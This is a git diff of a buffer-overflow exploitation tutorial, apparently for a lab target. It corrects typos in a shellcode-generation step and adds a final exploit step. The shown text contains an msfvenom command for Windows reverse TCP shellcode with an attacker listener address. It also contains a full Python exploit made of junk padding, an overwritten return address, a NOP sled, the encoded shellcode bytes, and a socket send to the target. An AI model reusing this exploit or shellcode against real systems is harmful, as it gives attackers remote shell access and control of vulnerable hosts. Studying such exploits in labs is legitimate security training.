@@ -254,7 +254,7 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 ## Step 5 Genrating The Shell Code
 
-**Moving Furture We will Generate the Reverse TCP shellcode to bypass the firewall if it is Anabled Type the follwing Command To gen erate the shellCode**
+**Moving Furture We will Generate the Reverse TCP shellcode to bypass the firewall if it is Anabled Type the follwing Command To generate the shellCode**
 <br  />
 
 >msfvenom -p windows/shell_reverse_tcp LHOST=192.168.94.10 LPORT=4444 EXITFUNC=thread -b "\x00" -a x86 -f python.
@@ -263,9 +263,66 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 <br  />
 
-**Let Me Explain what the Above Command is Doing 1st it will Create -p which denotes Payload follwoed by windows reverse shell Now over hear we should put our Linux Ip adderss and Port Number As we will going to get reverse shell back from the victim. -b option stands for badchar in our case we found bad char as \x00 which is universal bad char follwed by -a which specifies arch of the system in my case it is x86 64 bit and finally generate my shell code in -f format  in python**
-
+**Let Me Explain what the Above Command is Doing 1st it will Create -p which denotes Payload follwed by windows reverse shell Now over hear we should put our Linux Ip adderss and Port Number As we will going to get reverse shell back from the victim. -b option stands for badchar in our case we found bad char as \x00 which is universal bad char follwed by -a which specifies arch of the system in my case it is x86 64 bit and finally generate my shell code in -f format  in python**
 
 <br  />
+
+## Step 6 Exploit
+
+**This is the final stage of the Exploitation in which we will going to combine all the above codes and make one single python File named Exploit.py**
+ <br />
+ 
+ ```python
+ import socket
+import time
+import sys
+import struct
+
+offset=524
+
+junks=b"A"*offset
+
+new_eip=struct.pack(">I",0x311712F3)
+
+padding=b"\x90"*30
+
+buf =  b""
+buf += b"\xda\xc0\xb8\xb4\xa7\x21\xca\xd9\x74\x24\xf4\x5f\x29"
+buf += b"\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc\x03\xf3\xb4\xc3"
+buf += b"\x3f\x07\x52\x81\xc0\xf7\xa3\xe6\x49\x12\x92\x26\x2d"
+buf += b"\x57\x85\x96\x25\x35\x2a\x5c\x6b\xad\xb9\x10\xa4\xc2"
+buf += b"\x0a\x9e\x92\xed\x8b\xb3\xe7\x6c\x08\xce\x3b\x4e\x31"
+buf += b"\x01\x4e\x8f\x76\x7c\xa3\xdd\x2f\x0a\x16\xf1\x44\x46"
+buf += b"\xab\x7a\x16\x46\xab\x9f\xef\x69\x9a\x0e\x7b\x30\x3c"
+buf += b"\xb1\xa8\x48\x75\xa9\xad\x75\xcf\x42\x05\x01\xce\x82"
+buf += b"\x57\xea\x7d\xeb\x57\x19\x7f\x2c\x5f\xc2\x0a\x44\xa3"
+buf += b"\x7f\x0d\x93\xd9\x5b\x98\x07\x79\x2f\x3a\xe3\x7b\xfc"
+buf += b"\xdd\x60\x77\x49\xa9\x2e\x94\x4c\x7e\x45\xa0\xc5\x81"
+buf += b"\x89\x20\x9d\xa5\x0d\x68\x45\xc7\x14\xd4\x28\xf8\x46"
+buf += b"\xb7\x95\x5c\x0d\x5a\xc1\xec\x4c\x33\x26\xdd\x6e\xc3"
+buf += b"\x20\x56\x1d\xf1\xef\xcc\x89\xb9\x78\xcb\x4e\xbd\x52"
+buf += b"\xab\xc0\x40\x5d\xcc\xc9\x86\x09\x9c\x61\x2e\x32\x77"
+buf += b"\x71\xcf\xe7\xd8\x21\x7f\x58\x99\x91\x3f\x08\x71\xfb"
+buf += b"\xcf\x77\x61\x04\x1a\x10\x08\xff\xcd\xdf\x65\xa1\x07"
+buf += b"\x88\x77\x5d\x09\x14\xf1\xbb\x43\xb4\x57\x14\xfc\x2d"
+buf += b"\xf2\xee\x9d\xb2\x28\x8b\x9e\x39\xdf\x6c\x50\xca\xaa"
+buf += b"\x7e\x05\x3a\xe1\xdc\x80\x45\xdf\x48\x4e\xd7\x84\x88"
+buf += b"\x19\xc4\x12\xdf\x4e\x3a\x6b\xb5\x62\x65\xc5\xab\x7e"
+buf += b"\xf3\x2e\x6f\xa5\xc0\xb1\x6e\x28\x7c\x96\x60\xf4\x7d"
+buf += b"\x92\xd4\xa8\x2b\x4c\x82\x0e\x82\x3e\x7c\xd9\x79\xe9"
+buf += b"\xe8\x9c\xb1\x2a\x6e\xa1\x9f\xdc\x8e\x10\x76\x99\xb1"
+buf += b"\x9d\x1e\x2d\xca\xc3\xbe\xd2\x01\x40\xde\x30\x83\xbd"
+buf += b"\x77\xed\x46\x7c\x1a\x0e\xbd\x43\x23\x8d\x37\x3c\xd0"
+buf += b"\x8d\x32\x39\x9c\x09\xaf\x33\x8d\xff\xcf\xe0\xae\xd5"
+
+payload=junks+new_eip+padding+buf+b" \r\n"
+
+with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
+	c.connect(("192.168.94.131",9999))
+	c.recv(99999)
+	c.send(payload)
+	print("[!]Malicious Buffer Send Sucessfully ;-)")
+	c.close()
+ ```
 
 
